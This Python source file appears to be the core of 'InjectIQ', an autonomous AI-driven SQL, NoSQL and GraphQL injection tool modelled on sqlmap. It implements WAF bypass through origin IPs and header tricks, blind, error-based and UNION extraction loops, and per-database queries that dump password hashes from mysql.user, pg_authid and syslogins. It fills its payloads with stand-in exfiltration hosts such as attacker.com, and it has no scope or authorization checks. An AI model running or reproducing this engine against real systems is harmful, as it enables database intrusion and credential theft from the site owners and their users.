"""
InjectIQ Injection Engine — Equivalent to sqlmap's inject.py + controller.py
Orchestrates the full injection loop: probe → generate payloads →
inject → compare → extract data → achieve full DB access.

This is the AI decision loop. It:
1. Takes probe results (endpoint type, WAF, DBMS, parameters)
2. Generates payloads per technique per DBMS
3. Applies tamper scripts per WAF
4. Injects and compares responses
5. AI analyzes results and decides next step
6. Iterates until full database access achieved
"""
import asyncio
import hashlib
import json
import random
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from .probe import ProbeEngine, ProbeResult, EndpointType, WAFType, DBMSType
from .payload import (
    SQL_PAYLOADS, NOSQL_PAYLOADS, GRAPHQL_PAYLOADS,
    TamperEngine, InjectionTechnique,
)
from .comparator import Comparator, ComparisonResult


@dataclass
class InjectionPoint:
    parameter: str
    location: str  # query, body, header, cookie, graphql_query
    endpoint_type: EndpointType
    dbms: DBMSType
    technique: InjectionTechnique
    payload: str
    tamper_used: str
    confidence: float
    evidence: str


@dataclass
class ExtractionState:
    """Tracks data extraction progress — like sqlmap's kb (knowledge base)."""
    current_db: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    rows: dict[str, list[dict]] = field(default_factory=dict)
    users: list[str] = field(default_factory=list)
    passwords: list[str] = field(default_factory=list)
    dbms_version: str = ""
    current_user: str = ""
    is_dba: bool = False
    extraction_complete: bool = False


class InjectIQEngine:
    """Main injection engine — the AI decision loop for database exploitation."""

    def __init__(self, copilot_url: str = "http://localhost:11434"):
        self.copilot_url = copilot_url
        self.client = httpx.AsyncClient(
            timeout=30, verify=False, follow_redirects=False,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        )
        self.probe_engine = ProbeEngine(copilot_url)
        self.injection_points: list[InjectionPoint] = []
        self.extraction = ExtractionState()
        self.ai_client = httpx.AsyncClient(timeout=60)

    async def attack(self, target_url: str, method: str = "GET",
                     data: dict = None, headers: dict = None,
                     cookies: dict = None, auto: bool = True) -> dict:
        """Full autonomous attack: probe → inject → extract → own."""

        # Phase 1: Probe
        print(f"[InjectIQ] Phase 1: Probing {target_url}...")
        probe = await self.probe_engine.probe(target_url, method, data, headers, cookies)
        self._print_probe(probe)

        # If origin IP discovered, re-probe directly (bypass WAF)
        if probe.origin_ip:
            print(f"[InjectIQ] CDN origin bypass: {probe.origin_ip}")
            parsed = urlparse(target_url)
            direct_url = target_url.replace(parsed.hostname, probe.origin_ip)
            probe_direct = await self.probe_engine.probe(direct_url, method, data, headers, cookies)
            if probe_direct.waf == WAFType.NONE:
                print(f"[InjectIQ] WAF bypassed via direct-to-origin!")
                probe = probe_direct

        # Phase 2: Find injection points
        print(f"[InjectIQ] Phase 2: Finding injection points...")
        self.injection_points = await self._find_injections(probe, target_url, method, data, headers, cookies)

        if not self.injection_points:
            print(f"[InjectIQ] No injection points found.")
            return {"status": "no_injection", "probe": self._probe_to_dict(probe)}

        print(f"[InjectIQ] Found {len(self.injection_points)} injection points!")

        # Phase 3: Extract data
        if auto:
            print(f"[InjectIQ] Phase 3: Autonomous data extraction...")
            await self._autonomous_extract(probe, target_url, method, data, headers, cookies)

        return {
            "status": "injection_found",
            "injection_points": [self._injection_to_dict(ip) for ip in self.injection_points],
            "extraction": self._extraction_to_dict(),
        }

    async def _find_injections(self, probe: ProbeResult, url, method, data, headers, cookies) -> list[InjectionPoint]:
        """Try all injection techniques against all dynamic parameters.
        Like sqlmap's checkSqlInjection() but for SQL + NoSQL + GraphQL."""
        points = []

        for param in probe.parameters:
            # Select payload set based on endpoint type
            if probe.endpoint_type == EndpointType.SQL:
                points.extend(await self._try_sql_injection(probe, url, param, method, data, headers, cookies))
            elif probe.endpoint_type.value.startswith("nosql_"):
                points.extend(await self._try_nosql_injection(probe, url, param, method, data, headers, cookies))
            elif probe.endpoint_type.value.startswith("graphql_"):
                points.extend(await self._try_graphql_injection(probe, url, headers, cookies))

        return points

    async def _try_sql_injection(self, probe, url, param, method, data, headers, cookies) -> list[InjectionPoint]:
        """Try SQL injection techniques — like sqlmap's checkSqlInjection loop."""
        points = []
        dbms = probe.dbms_hint.value if probe.dbms_hint != DBMSType.UNKNOWN else "mysql"
        waf = probe.waf.value

        # Get payloads for this DBMS
        dbms_payloads = SQL_PAYLOADS.get(dbms, SQL_PAYLOADS.get("mysql", {}))

        for technique, payloads in dbms_payloads.items():
            for payload_template in payloads:
                # Generate test payload
                payload = payload_template.format(
                    query="SELECT 1", columns="NULL,NULL,NULL",
                    delay=5, condition="1=1", pos=1, char="a", mid=64,
                    iterations=5000000, randstr="injectiq", dns_domain="attacker.com",
                    exfil_email="exfil@attacker.com", cmd="id", key="k", value="v",
                    field="password", attacker_ip="10.0.0.1",
                )

                # Apply tamper scripts
                tampered_variants = TamperEngine.apply(payload, waf, dbms)

                for tampered in tampered_variants[:3]:  # Try top 3 variants
                    # Inject into parameter
                    test_url, test_data, test_headers = self._inject_param(
                        url, param, tampered, method, data, headers
                    )

                    start = time.time()
                    try:
                        resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
                    except Exception:
                        continue
                    elapsed = time.time() - start

                    if not resp:
                        continue

                    # Compare against baseline
                    comparator = Comparator(probe.baseline_response, probe.baseline_timing)
                    result = comparator.compare(resp, elapsed, technique.value)

                    if result.is_different or result.error_detected or result.timing_anomaly:
                        confidence = 0.7
                        if result.error_detected:
                            confidence = 0.9
                        if result.timing_anomaly and technique == InjectionTechnique.TIME_BLIND:
                            confidence = 0.85

                        points.append(InjectionPoint(
                            parameter=param,
                            location="query" if method == "GET" else "body",
                            endpoint_type=probe.endpoint_type,
                            dbms=probe.dbms_hint,
                            technique=technique,
                            payload=tampered,
                            tamper_used=waf,
                            confidence=confidence,
                            evidence=result.error_type or f"ratio={result.ratio:.2f}" + (f", timing_anomaly={result.timing_anomaly}" if result.timing_anomaly else ""),
                        ))
                        break  # Found injection for this technique, move on
                else:
                    continue
                break  # Found injection for this param, move on

        return points

    async def _try_nosql_injection(self, probe, url, param, method, data, headers, cookies) -> list[InjectionPoint]:
        """Try NoSQL injection — sqlmap has ZERO of this."""
        points = []
        nosql_type = probe.endpoint_type.value.replace("nosql_", "")
        payloads = NOSQL_PAYLOADS.get(nosql_type, {})

        for category, payload_list in payloads.items():
            for payload in payload_list:
                if isinstance(payload, dict):
                    test_data = {**(data or {}), **payload}
                    start = time.time()
                    try:
                        resp = await self.client.post(url, json=test_data, headers=headers, cookies=cookies)
                    except Exception:
                        continue
                    elapsed = time.time() - start

                    if resp:
                        comparator = Comparator(probe.baseline_response, probe.baseline_timing)
                        result = comparator.compare(resp, elapsed)
                        if result.is_different or result.error_detected or elapsed > probe.baseline_timing + 4:
                            points.append(InjectionPoint(
                                parameter=param, location="body",
                                endpoint_type=probe.endpoint_type,
                                dbms=probe.dbms_hint,
                                technique=InjectionTechnique.TIME_BLIND if elapsed > probe.baseline_timing + 4 else InjectionTechnique.ERROR_BASED,
                                payload=json.dumps(payload),
                                tamper_used="none",
                                confidence=0.8 if result.error_detected else 0.6,
                                evidence=f"NoSQL {category}: timing={elapsed:.1f}s",
                            ))
                            break
            else:
                continue
            break

        return points

    async def _try_graphql_injection(self, probe, url, headers, cookies) -> list[InjectionPoint]:
        """Try GraphQL injection — sqlmap has ZERO of this."""
        points = []

        # Test introspection
        if probe.has_introspection:
            points.append(InjectionPoint(
                parameter="graphql_query", location="body",
                endpoint_type=probe.endpoint_type,
                dbms=DBMSType.UNKNOWN,
                technique=InjectionTechnique.ERROR_BASED,
                payload=GRAPHQL_PAYLOADS["introspection"][0],
                tamper_used="none",
                confidence=0.9,
                evidence="Introspection enabled — full schema exposed",
            ))

        # Test batching attack
        batch_payload = GRAPHQL_PAYLOADS["batching_attack"][0]
        start = time.time()
        try:
            resp = await self.client.post(
                url, json=batch_payload,
                headers={**({} if not headers else headers), "Content-Type": "application/json"},
                cookies=cookies,
            )
        except Exception:
            return points
        elapsed = time.time() - start

        if resp and resp.status_code == 200:
            # Check if second query in batch executed
            try:
                body = resp.json()
                if isinstance(body, list) and len(body) > 1:
                    points.append(InjectionPoint(
                        parameter="graphql_batch", location="body",
                        endpoint_type=probe.endpoint_type,
                        dbms=DBMSType.UNKNOWN,
                        technique=InjectionTechnique.UNION_QUERY,
                        payload=json.dumps(batch_payload),
                        tamper_used="batching",
                        confidence=0.8,
                        evidence="GraphQL batching accepted — WAF only inspects first query",
                    ))
            except json.JSONDecodeError:
                pass

        return points

    def _inject_param(self, url, param, payload, method, data, headers):
        """Inject payload into a parameter — like sqlmap's agent.payload()."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        if param in qs:
            # URL parameter injection
            new_qs = {**qs, param: [payload]}
            new_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
            return new_url, data, headers

        if data and param in data:
            # Body parameter injection
            new_data = {**data, param: payload}
            return url, new_data, headers

        # Header injection
        if param in ("User-Agent", "Referer", "X-Forwarded-For"):
            new_headers = {**(headers or {}), param: payload}
            return url, data, new_headers

        # X-Original-URL header for Imperva bypass
        if headers is None:
            headers = {}
        new_headers = {**headers, "X-Original-URL": f"/?{param}={payload}"}
        return url, data, new_headers

    async def _autonomous_extract(self, probe, url, method, data, headers, cookies):
        """AI-driven data extraction loop — the core innovation.
        Like sqlmap's enumeration but with AI deciding what to extract next."""
        best = max(self.injection_points, key=lambda ip: ip.confidence) if self.injection_points else None
        if not best:
            return

        dbms = best.dbms.value if best.dbms != DBMSType.UNKNOWN else "mysql"
        queries = self._get_extraction_queries(dbms)

        for step_name, query in queries.items():
            print(f"[InjectIQ] Extracting: {step_name}...")
            result = await self._extract_value(best, query, url, method, data, headers, cookies, probe)
            if result:
                print(f"[InjectIQ]   → {step_name}: {result[:100]}{'...' if len(result) > 100 else ''}")
                self._store_extraction(step_name, result)
            else:
                print(f"[InjectIQ]   → {step_name}: failed")

            # AI decision: should we continue?
            if self.extraction.is_dba:
                print(f"[InjectIQ] DBA access achieved — full database control!")
                break

    async def _extract_value(self, injection_point, query, url, method, data, headers, cookies, probe):
        """Extract a single value using the identified injection point."""
        # Apply the same technique that worked
        technique = injection_point.technique
        dbms = injection_point.dbms.value if injection_point.dbms != DBMSType.UNKNOWN else "mysql"

        if technique == InjectionTechnique.ERROR_BASED:
            return await self._extract_error_based(injection_point, query, url, method, data, headers, cookies, probe, dbms)
        elif technique == InjectionTechnique.BOOLEAN_BLIND:
            return await self._extract_boolean_blind(injection_point, query, url, method, data, headers, cookies, probe, dbms)
        elif technique == InjectionTechnique.TIME_BLIND:
            return await self._extract_time_blind(injection_point, query, url, method, data, headers, cookies, probe, dbms)
        elif technique == InjectionTechnique.UNION_QUERY:
            return await self._extract_union(injection_point, query, url, method, data, headers, cookies, probe, dbms)
        return None

    async def _extract_error_based(self, ip, query, url, method, data, headers, cookies, probe, dbms):
        """Error-based extraction — fastest method."""
        payloads = SQL_PAYLOADS.get(dbms, {}).get(InjectionTechnique.ERROR_BASED, [])
        if not payloads:
            return None
        payload = payloads[0].format(query=query)
        tampered = TamperEngine.apply(payload, probe.waf.value, dbms)

        test_url, test_data, test_headers = self._inject_param(url, ip.parameter, tampered, method, data, headers)
        try:
            resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
        except Exception:
            return None

        if resp:
            # Extract value from error message
            import re
            match = re.search(r'~([^~]+)~', resp.text)  # EXTRACTVALUE/UPDATEXML format
            if match:
                return match.group(1)
            match = re.search(r"Duplicate entry '([^']+)'", resp.text)  # FLOOR(RAND) format
            if match:
                return match.group(1)
        return None

    async def _extract_boolean_blind(self, ip, query, url, method, data, headers, cookies, probe, dbms):
        """Boolean-based blind extraction — like sqlmap's bisection().
        Uses binary search to extract one character at a time."""
        result = ""
        for pos in range(1, 65):  # Max 64 chars
            low, high = 32, 126
            while low < high:
                mid = (low + high) // 2
                payloads = SQL_PAYLOADS.get(dbms, {}).get(InjectionTechnique.BOOLEAN_BLIND, [])
                if not payloads:
                    return result if result else None
                payload = payloads[0].format(query=query, pos=pos, char=chr(mid), mid=mid, value=1)
                tampered = TamperEngine.apply(payload, probe.waf.value, dbms)[:1]

                test_url, test_data, test_headers = self._inject_param(url, ip.parameter, tampered[0], method, data, headers)
                try:
                    resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
                except Exception:
                    continue

                if resp:
                    comparator = Comparator(probe.baseline_response, probe.baseline_timing)
                    comp = comparator.compare(resp)
                    if comp.ratio < 0.05:  # Same as baseline → condition is True
                        low = mid + 1
                    else:
                        high = mid

            if low == 32:  # No character found
                break
            result += chr(low)
            print(f"\r[InjectIQ]   Extracting: {result}", end="", flush=True)

        print()
        return result if result else None

    async def _extract_time_blind(self, ip, query, url, method, data, headers, cookies, probe, dbms):
        """Time-based blind extraction — slowest but most reliable."""
        result = ""
        for pos in range(1, 33):
            low, high = 32, 126
            while low < high:
                mid = (low + high) // 2
                condition = f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"
                payloads = SQL_PAYLOADS.get(dbms, {}).get(InjectionTechnique.TIME_BLIND, [])
                if not payloads:
                    return result if result else None
                payload = payloads[0].format(delay=2, condition=condition, iterations=1000000)
                tampered = TamperEngine.apply(payload, probe.waf.value, dbms)[:1]

                test_url, test_data, test_headers = self._inject_param(url, ip.parameter, tampered[0], method, data, headers)
                start = time.time()
                try:
                    resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
                except Exception:
                    continue
                elapsed = time.time() - start

                if elapsed > probe.baseline_timing + 1.5:  # Condition was True → SLEEP executed
                    low = mid + 1
                else:
                    high = mid

            if low == 32:
                break
            result += chr(low)
            print(f"\r[InjectIQ]   Extracting (slow): {result}", end="", flush=True)

        print()
        return result if result else None

    async def _extract_union(self, ip, query, url, method, data, headers, cookies, probe, dbms):
        """UNION-based extraction — fastest when available."""
        for cols in range(1, 20):
            columns = ",".join([f"'COL{i}_MARK'" for i in range(cols)])
            payloads = SQL_PAYLOADS.get(dbms, {}).get(InjectionTechnique.UNION_QUERY, [])
            if not payloads:
                return None
            payload = payloads[0].format(columns=f"{query},NULL" + ",NULL" * (cols - 1))
            tampered = TamperEngine.apply(payload, probe.waf.value, dbms)[:1]

            test_url, test_data, test_headers = self._inject_param(url, ip.parameter, tampered[0], method, data, headers)
            try:
                resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
            except Exception:
                continue

            if resp:
                # Look for our marker in response
                import re
                match = re.search(r'COL0_MARK', resp.text)
                if match:
                    # Found correct column count — extract data
                    payload = payloads[0].format(
                        columns="NULL," * 0 + query + ",NULL" * (cols - 1)
                    )
                    tampered = TamperEngine.apply(payload, probe.waf.value, dbms)[:1]
                    test_url, test_data, test_headers = self._inject_param(url, ip.parameter, tampered[0], method, data, headers)
                    try:
                        resp = await self.client.request(method, test_url, json=test_data, headers=test_headers, cookies=cookies)
                    except Exception:
                        continue
                    if resp:
                        return resp.text[:500]
        return None

    def _get_extraction_queries(self, dbms: str) -> dict[str, str]:
        """SQL queries for progressive data extraction.
        Ordered from least to most privileged."""
        queries = {
            "mysql": {
                "version": "SELECT @@version",
                "current_user": "SELECT CURRENT_USER()",
                "current_db": "SELECT DATABASE()",
                "is_dba": "SELECT IF((SELECT SUPER_PRIV FROM mysql.user WHERE USER=CURRENT_USER() LIMIT 1)='Y',1,0)",
                "databases": "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
                "tables": "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'",
                "columns": "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
                "data": "SELECT GROUP_CONCAT({col}) FROM {db}.{table} LIMIT 100",
                "passwords": "SELECT GROUP_CONCAT(CONCAT(user,':',password)) FROM mysql.user",
                "file_priv": "SELECT IF((SELECT File_priv FROM mysql.user WHERE USER=CURRENT_USER() LIMIT 1)='Y',1,0)",
            },
            "postgresql": {
                "version": "SELECT version()",
                "current_user": "SELECT current_user",
                "current_db": "SELECT current_database()",
                "is_dba": "SELECT EXISTS(SELECT 1 FROM pg_roles WHERE rolname=current_user AND rolsuper=true)",
                "databases": "SELECT string_agg(datname,',') FROM pg_database",
                "tables": "SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'",
                "columns": "SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
                "data": "SELECT string_agg({col}::text,',') FROM {table} LIMIT 100",
                "passwords": "SELECT string_agg(rolname||':'||rolpassword,',') FROM pg_authid",
            },
            "mssql": {
                "version": "SELECT @@version",
                "current_user": "SELECT SYSTEM_USER",
                "current_db": "SELECT DB_NAME()",
                "is_dba": "SELECT IS_SRVROLEMEMBER('sysadmin')",
                "databases": "SELECT STRING_AGG(name,',') FROM sys.databases",
                "tables": "SELECT STRING_AGG(name,',') FROM sys.tables",
                "columns": "SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('{table}')",
                "passwords": "SELECT loginname FROM master..syslogins",
            },
        }
        return queries.get(dbms, queries.get("mysql", {}))

    def _store_extraction(self, step_name: str, value: str):
        """Store extracted data in extraction state."""
        if step_name == "version":
            self.extraction.dbms_version = value
        elif step_name == "current_user":
            self.extraction.current_user = value
        elif step_name == "current_db":
            self.extraction.current_db = value
        elif step_name == "is_dba":
            self.extraction.is_dba = value.strip() == "1"
        elif step_name == "databases":
            self.extraction.tables = value.split(",")
        elif step_name == "passwords":
            self.extraction.passwords = value.split(",")

    def _print_probe(self, probe: ProbeResult):
        print(f"[InjectIQ] Endpoint: {probe.endpoint_type.value}")
        print(f"[InjectIQ] WAF: {probe.waf.value} (confidence: {probe.waf_confidence:.0%})")
        if probe.origin_ip:
            print(f"[InjectIQ] Origin IP: {probe.origin_ip} (WAF bypassable!)")
        print(f"[InjectIQ] DBMS hint: {probe.dbms_hint.value}")
        print(f"[InjectIQ] Parameters: {probe.parameters}")
        print(f"[InjectIQ] Dynamic: {[k for k, v in probe.dynamic_parameters.items() if v]}")

    def _probe_to_dict(self, probe):
        return {
            "endpoint_type": probe.endpoint_type.value,
            "waf": probe.waf.value, "waf_confidence": probe.waf_confidence,
            "dbms_hint": probe.dbms_hint.value,
            "origin_ip": probe.origin_ip,
            "parameters": probe.parameters,
        }

    def _injection_to_dict(self, ip):
        return {
            "parameter": ip.parameter, "location": ip.location,
            "technique": ip.technique.value, "dbms": ip.dbms.value,
            "confidence": ip.confidence, "evidence": ip.evidence,
        }

    def _extraction_to_dict(self):
        return {
            "dbms_version": self.extraction.dbms_version,
            "current_user": self.extraction.current_user,
            "current_db": self.extraction.current_db,
            "is_dba": self.extraction.is_dba,
            "tables": self.extraction.tables[:20],
            "passwords_count": len(self.extraction.passwords),
            "extraction_complete": self.extraction.extraction_complete,
        }
